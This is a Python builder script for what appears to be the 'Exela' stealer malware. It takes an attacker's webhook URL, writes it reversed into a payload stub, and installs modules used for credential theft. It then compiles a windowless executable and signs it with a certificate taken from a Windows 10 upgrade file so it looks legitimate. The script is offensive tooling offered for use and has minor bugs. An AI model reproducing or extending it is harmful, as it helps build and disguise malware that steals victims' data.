import os, shutil, time

clearTerm = ""

if os.name == "nt":
    clearTerm == "cls"
else:clearTerm == "clear"

webhook = str(input("enter your webhook url : "))
os.system(clearTerm)

iconchange = False
icon = str(input("Yes/no\nDo u want to change icon : "))
iconpath = ""
if icon.lower() == "yes" or icon.lower == "y":
    iconchange = True
    iconpath = str(input("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "))
    if not iconpath.endswith(".ico"):
        print("Pls use .ico files")
        time.sleep(2)
        exit()
else:
    iconchange = False


with open("Exela.py", "r", encoding="utf-8", errors="ignore") as sourceCode:
    rip = sourceCode.read()
    replacedCode = rip.replace('%REPLACE_ME_FOR_QUiCADXD%', webhook[::-1])
with open("stub.py", "w", encoding="utf-8", errors="ignore") as f:
    f.write(str(replacedCode))

def installModules():
    try:
        print("installing all module pls wait")
        os.system("pip install psutil")
        os.system("pip install pypiwin32")
        os.system("pip install pycrypto")
        os.system("pip install pycryptodome")
        os.system("pip install pycryptodome")
        os.system("pip install uuid")
        os.system("pip install dhooks")
        os.system("pip install requests")
        os.system("pip install wmi")
        os.system("pip install pyinstaller")
        print("All module installed")
    except:
        print("pls use python 3.10 or 3.11");exit()


def buildFile():
    print("Building Your File pls wait.")
    pyinstallerCommand = "pyinstaller --onefile --noconsole --clean "
    if iconchange == True:
        pyinstallerCommand += f"--icon={iconpath} stub.py"
    else:
        pyinstallerCommand += "stub.py"
    os.system(pyinstallerCommand)
    print("File build was succesfully")
    print("Signing file pls wait")
    digitalSign("Windows10Upgrade9252.exe", os.getcwd() + "\\Dist\\stub.exe")
    print("file signed was succesfully")
    try:
        shutil.rmtree("build")
        os.remove('stub.spec')
        os.remove("stub.py")
        shutil.rmtree("dist")
    except:
        pass # sex
  
    os.system(clearTerm)
    print("your file build succesfully\nYour file is => Exela.exe")
    time.sleep(2)
    exit()
def digitalSign(path, signedFile):
    os.system(f"python digital-sign.py -i {path} -t {signedFile} -o Exela.exe")

if __name__ == '__main__':
    installModules()
    buildFile()
